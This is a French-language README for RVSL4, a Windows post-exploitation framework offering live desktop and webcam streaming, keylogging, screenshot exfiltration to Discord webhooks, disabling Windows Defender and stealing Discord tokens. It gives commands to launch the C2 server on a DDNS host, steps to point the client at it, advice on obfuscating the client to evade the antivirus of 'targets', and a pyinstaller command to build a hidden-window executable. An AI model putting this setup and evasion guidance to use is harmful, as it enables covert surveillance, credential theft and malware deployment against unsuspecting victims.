# RVSL4 - Modular Windows Post Exploit Framework

# Description

RVSL4 est un framework modulaire conçu pour des actions de surveillance électronique sur des appareils de type ordinateur sous l'OS Windows. Il permet une post-exploitation flexible et personnalisable, offrant un ensemble d'outils pour surveiller les activités et collecter des informations à distance. RVSL4 est destiné à des fins de surveillance uniquement, et doit être utilisé en conformité avec les lois et régulations en vigueur.

# ADDONS INTERNES

    - DESKTOP : Ouvre un serveur pour recevoir le flux du bureau client en temps réel.
    - WEBCAM : Ouvre un serveur pour recevoir le flux de la webcam client en temps réel. (60 FPS)

# ADDONS EXTERNES

    - KLOG : Suivi des entrées clavier pour analyser les interactions utilisateur.
    - AUTOSCP : Effectue des captures d'écrans du bureau en automatique avec un timer modulable et exfiltre ensuite les captures sur discord via un webhook.
    - DESKSCP : Effectue des captures d'écrans du bureau ainsi que de la webcam et exfiltre ensuite les captures sur discord via un webhook.
    - DWINDEF : Désactive windows defender.
    - STLINFOS : Steal les infos et le token discord avec Creal.

# USAGE

Lancer le serveur C2 avec les commandes suivantes :

    python rvsl4.py <IP/DDNS> <PORT>
    Exemple : python rvsl4.py sha78221662145822.ddns.net 5555

![2](https://github.com/user-attachments/assets/f0179195-733e-4332-9c8b-04dfaa926c20)

Modifier les informations de connexion dans le fichier client (cli.py) avec la même IP ou le même DDNS que vous avez utilisé pour lancer le serveur afin que votre client se connecte correctement à votre serveur C2 RVSL4.

![3](https://github.com/user-attachments/assets/742a4f1a-07b4-41cb-82ac-382315cc6dc1)

# OBFUSCATION

Il est conseiller d'obfusquer votre fichier client avant d'entamer la construction afin de contourner les antivirus.
Il n'existe pas vraiment de meilleur techniques d'obfuscation car celà dépend en premier temps des antivirus utilisé par vos cibles et dans un second temps de la force et de la technique utilisé pour votre obfuscation, il existe beaucoup de manières d'obfusquer un code mais je vais vous présenter la base.

- Via modules python

      pip install pyarmor            https://pypi.org/project/pyarmor/
      pip install PyObfuscator       https://pypi.org/project/PyObfuscator/

- Via outils web

      https://pyobfuscate.com/
      https://development-tools.net/python-obfuscator/
      https://freecodingtools.org/py-obfuscator
      https://pyob.oxyry.com/

- Ressources Github

      https://github.com/billythegoat356/Hyperion
      https://github.com/billythegoat356/Kramer
      https://github.com/spicesouls/onelinepy
      https://github.com/davidteather/python-obfuscator

Une fois obfusquer construisez ensuite votre fichier client en executable (cli.exe)
Commande pour construire via pyinstaller : pyinstaller --onefile --windowed FILE_NAME.py

![6](https://github.com/user-attachments/assets/2de6aaf8-0a12-4131-96e3-83cfe54d9e00)

